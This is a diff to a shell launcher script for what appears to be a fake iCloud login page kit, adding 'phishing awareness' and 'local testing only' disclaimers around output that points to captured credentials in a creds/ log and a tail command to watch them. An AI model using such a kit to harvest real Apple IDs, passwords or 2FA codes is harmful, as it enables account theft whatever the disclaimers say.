@@ -19,12 +19,16 @@ cat << 'EOF'
 ║       |_|\___||_| |_|___/_| |_|                          ║
 ║                                                          ║
 ║        EDUCATIONAL PROJECT - LOCAL TESTING ONLY          ║
+║        iCloud fake page for local phishing awareness     ║
 ║        localhost / 192.168.x.x                           ║
 ║                                                          ║
 ╚══════════════════════════════════════════════════════════╝
 EOF
 printf "${RESET}"
 
+echo ""
+printf "${YELLOW}⚠️  Disclosure:${RESET} This starts an iCloud fake page intended only for local phishing-awareness testing and education.\n"
+printf "${YELLOW}⚠️  Use only:${RESET} Run it on localhost or authorized private-network devices. Do not collect real credentials.\n"
 echo ""
 printf "${CYAN}📁 Working Directory:${RESET} %s\n" "$(pwd)"
 echo ""
@@ -61,6 +65,7 @@ printf "${CYAN}📊 MONITORING CAPTURES:${RESET}\n"
 echo "═══════════════════════════════════════════════════════════════════════════"
 echo ""
 echo "   Captured data will be stored in: $(pwd)/creds/"
+echo "   Educational testing only: do not enter or store real Apple IDs, passwords, or 2FA codes."
 echo ""
 echo "   Monitor in real-time (in another terminal):"
 echo "   tail -f $(pwd)/creds/all_credentials.log"
